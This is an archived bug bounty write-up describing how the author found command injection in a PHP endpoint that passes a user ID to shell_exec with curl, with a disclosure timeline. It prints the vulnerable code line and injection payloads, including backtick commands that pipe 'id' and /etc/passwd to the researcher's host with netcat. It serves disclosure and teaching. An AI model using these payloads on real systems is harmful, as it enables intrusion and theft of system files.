---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-12-05_getting-a-rce-ctf-way.md
original_filename: 2017-12-05_getting-a-rce-ctf-way.md
title: Getting a RCE — CTF Way
category: documents
detected_topics:
- command-injection
- file-upload
- api-security
tags:
- imported
- documents
- command-injection
- file-upload
- api-security
language: en
raw_sha256: 0c730920980d314e0bbe4e24473d69e0c91ff6567372587760e0c3597c6b2d3b
text_sha256: d3b8f8ab0f2512c7786b6fdaf456f81bea6a718158ff1ac24e502642625d900d
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# Getting a RCE — CTF Way

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-12-05_getting-a-rce-ctf-way.md
- Source Type: markdown
- Detected Topics: command-injection, file-upload, api-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `0c730920980d314e0bbe4e24473d69e0c91ff6567372587760e0c3597c6b2d3b`
- Text SHA256: `d3b8f8ab0f2512c7786b6fdaf456f81bea6a718158ff1ac24e502642625d900d`


## Content

---
title: "Getting a RCE — CTF Way"
page_title: "Getting a RCE — CTF Way. Recently I was invited to a private… | by Uranium238s | Medium"
url: "https://medium.com/@uranium238/getting-a-rce-ctf-way-2fd612fb643f"
authors: ["Rojan Rijal (@uraniumhacker)"]
bugs: ["RCE"]
publication_date: "2017-12-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6036
scraped_via: "browseros"
---

# Getting a RCE — CTF Way

Getting a RCE — CTF Way
Uranium238s
Follow
4 min read
·
Dec 6, 2017

366

1

Recently I was invited to a private program of a company. As a fresh start, I decided to look around and see what I could find. This company, required that I verify my account with some confidential information so I reached out to their sec engineers and team on how this could be done. Once the verification was done by adding some fake data, I moved onto to find some severe vulnerability. One of them was a RCE on their server. Most of the details here will be a redacted version to keep confidential information, private.

When I first started in this app, I knew they were vulnerable for RCE. Gut feeling combined with some recon gave me the feeling that I could get a RCE. It was just a matter of where and how. Like I always do, I played with the app for a while and made a list of features that could have this vulnerability. For example file upload was something that was in top of my list. I tried some steps to upload php or even html to just see if I could upload a file. Unfortunately, it was pretty tight in security on file uploads so I decided to move on.

After that I moved onto another endpoint, lets call this endpoint_lvl1 . This was used to send some request to another vendor to buy some product. It needed the price of the product and the user id. This was likely using an API or some form of request. In PHP you can do this multiple ways. curl request, simple api request and many more. I have basic experience of PHP so I decided to layout / program possible source code for that part. This way I could visualize the code as it happened. The request was sending my product price and user id. And in result, it will either result something like Successfully bought the product and reduce the balance from the account or it would say something like I could not get the user account. If you don't have a user account on this vendor, create one please .

When there was no response form the vendor’s server, it sent a 500 Internal server error. Now comes the part of CTF hunting. The recon that I had done before had confirmed that they had RCE and it should not be hard to find. So if this was the endpoint that was vulnerable to RCE then there should not be much work needed. I also noticed that while other things might change, the length of user id was always the same. If it was less than that, it would send an error asking user to Put a valid user id. Now because we know this uses PHP and because this is vulnerable to RCE, I had to eliminate some option. API would be hard to get RCE with unless there was some really shady stuff going on there. So I went with sth that no one could have possibly thought of :

Curl
file_get_contents
and if it is really vulnerable how about having a shell_exec() or system()

I went to test with each and everyone of it. I created a local instance on my server, creating vulnerable PHP with each types to get RCE, that way I tried a small payload to see how it works for each. Curl and file_get_contents did not work. shell_exec() kept bugging me on how it could potentially work. Along with that, there were some more behaviors that stood out.

Exploit:

During the analysis of the application, as previously stated, when a product was bought, an external call was made. However this request never showed up on Burp. This was interesting and because this was php, I thought it could be something like: shell_exec('curl {website with request}') . This way the request will never go to burp and the system will be able to run the cURL request.

Get Uranium238s’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So a sample code will have an activity like this:

User enters the ID which will be used to buy the product
The ID is then sent to external website in format like this:
shell_exec('curl -X POST -d "strCommand=GETUSERINFO'.'&strParam1='.'|user='.$_POST['user_id'].'|" '.$url.' -k');

The ID was supposed to be 7 character longs but they did not check if the ID was an int or a string and simply checked the first character to deduce that it was an int so if we simply have 1xxxxxx then we would bypass that. So now with a sample request that could look like something above, I sent a payload: 1xxxxxxxxxx`sleep 5` . This payload will bypass the string check and at the same time, allow me to run a command through shell_exec(). Once the request was sent, there was a delay of 5 seconds.

Next, I sent: 1xxxxxxxxxxxxx`id | nc {my_ip} 80` and the server successfully received the server user id which could be something like this: uid=0(root) gid=0(root) groups=0(root).

After that, I launched a request for /etc/passwd and got its content as well with this payload:

1xxxxxxxxxxxxx`cat /etc/passwd| nc {my_ip} 80`

Timeline: (Date and time are from h1 system)

July 3, 2017 03:37:23-Report submitted

July 3, 2017 03:47:20-Report Triaged

July 3, 2017 03:58:44-A pretty detailed writeup about how this work was sent

July 8, 2017 — Vulnerability Fixed
